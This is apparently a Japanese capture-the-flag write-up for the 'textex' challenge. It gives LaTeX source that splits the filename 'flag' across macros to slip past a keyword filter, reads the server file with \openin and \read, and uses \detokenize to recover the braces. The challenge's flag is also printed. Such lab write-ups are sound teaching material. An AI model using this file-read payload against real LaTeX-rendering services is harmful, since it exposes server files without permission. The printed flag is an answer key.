# textex

## 解法

配布されている環境で再現し以下のコードで flag を入手することは出来たが肝心の本番環境では動作しなかった。

**ファイルの内容を一行ずつ読み出す latex**

```latex
\documentclass{article}
\begin{document}

\newcommand\x{fl}
\newcommand\y{ag}

\newread\file
\openin\file=\x\y
\loop\unless\ifeof\file
    \read\file to\fileline
 
\fileline

\repeat
\closein\file


\end{document}
```

flag の構文に問題があるのではないと思いフラグの形式を確認してみると中括弧が使われている。

```
ctf4b{xxxxxxxx}
```

サニタイズして表示する方法を検索し latex を書く

`\fileline` `\detokenize\expandafter` を追加

```latex
\documentclass{article}
\begin{document}

\newcommand\x{fl}
\newcommand\y{ag}

\newread\file
\openin\file=\x\y
\loop\unless\ifeof\file
    \read\file to\fileline
 
\detokenize\expandafter{\fileline}

\repeat
\closein\file


\end{document}
```

すると以下の結果を得ることが出来る

```
ctf4b–15˙73x˙pr0n0unc3d˙ch0u?""
```

サニタイズされている箇所を元に戻すとフラグを得ることができる。

```
- = {
"" = }
˙ = _

ctf4b{15_73x_pr0n0unc3d_ch0u?}
```

## フラグ

```
ctf4b{15_73x_pr0n0unc3d_ch0u?}
```